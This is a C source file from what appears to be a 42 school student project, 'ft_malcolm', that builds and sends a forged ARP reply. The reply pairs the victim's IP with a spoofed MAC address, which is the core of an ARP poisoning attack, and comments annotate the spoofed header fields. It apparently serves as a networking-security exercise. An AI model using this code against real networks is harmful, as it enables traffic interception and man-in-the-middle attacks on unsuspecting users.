/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   response.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lle-saul <lle-saul@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/08 12:12:33 by lle-saul          #+#    #+#             */
/*   Updated: 2025/05/12 13:12:11 by lle-saul         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

t_packet	create_send_pkg(t_info *info, struct ethhdr eth, struct ether_arp arp)
{
	t_packet	packet;
	
	ft_memset(&packet, 0, sizeof(t_packet));
	packet.eth = eth;
	packet.arp = arp;
	
	ft_memcpy(packet.eth.h_dest, eth.h_source, ETH_ALEN);
	ft_memcpy(packet.eth.h_source, info->src_mac, ETH_ALEN);

	ft_memcpy(packet.arp.arp_sha, info->src_mac, ETH_ALEN);
	ft_memcpy(packet.arp.arp_spa, arp.arp_tpa, 4);
	ft_memcpy(packet.arp.arp_tha, arp.arp_sha, ETH_ALEN);
	ft_memcpy(packet.arp.arp_tpa, arp.arp_spa, 4);
	
	return (packet);
}

/*[ Ethernet Header ]
  - Destination MAC (celui qui a fait la requête)
  - Source MAC (spoofed)
  - Type = 0x0806 (ARP)

[ ARP Header ]
  - sender MAC = spoofed [arp_sha]
  - sender IP = IP de la victime [arp_spa]
  - target MAC = MAC du demandeur [arp_tha]
  - target IP = IP du demandeur [arp_tpa]*/

void	send_pkg(t_packet packet, struct sockaddr_ll *recv_addr)
{
	print_pkg(&packet.arp);
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");

	if (sendto(g_socket, &packet, sizeof(t_packet), 0, (struct sockaddr *)recv_addr, sizeof(struct sockaddr_ll)) < 0) {
		fprintf(stderr, "Error sending packet: %s\n", strerror(errno));
		return ;
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
}
